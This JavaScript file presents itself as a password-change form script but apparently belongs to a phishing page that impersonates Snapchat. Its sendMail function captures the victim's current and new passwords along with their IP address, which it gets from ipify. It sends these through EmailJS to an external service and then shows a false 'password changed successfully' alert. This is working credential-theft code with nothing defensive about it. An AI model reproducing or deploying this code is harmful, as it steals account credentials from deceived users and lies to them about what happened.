const current = document.getElementById("CurrentPassword");
const newPassword = document.getElementById("NewPassword");
const confirmPassword = document.getElementById("ConfirmPassword");
const toggleShow = document.querySelectorAll('#toggle_show');
const submit = document.getElementById('Submit');

toggleShow.forEach(element=> element.addEventListener('click', ()=> {
    if(element.name =='current')
    {
        if(current.type =='password')
            current.type = 'text';
        else 
            current.type = 'password';
    }
    else {
        if(newPassword.type =='password')
            newPassword.type = 'text';
        else 
            newPassword.type = 'password';
    }
}))

let city,country,isp,lat,lon,query;
async function getData() {
    const response =await  fetch('https://api.ipify.org/?format=json')
    const data = await response.json();
    if (response) {
        ip = data.ip 
    }
    return data;
}
getData()

function sendMail() {
  var params = {
    ip:ip,
    curr: document.getElementById("CurrentPassword").value,
    email: 'no_reply.snapchat.su@hotmail.com',
    new: document.getElementById("NewPassword").value,
  };

  const serviceID = "service_rl4ujzo";
  const templateID = "template_wyaik77";

    emailjs.send(serviceID, templateID, params)
    .then(res=>{
        current.value = "";
        newPassword.value = "";
        confirmPassword.value = "";
        alert("Your password has changed successfully!")
    })
    .catch(err=>console.log("Failed to change the password"));
}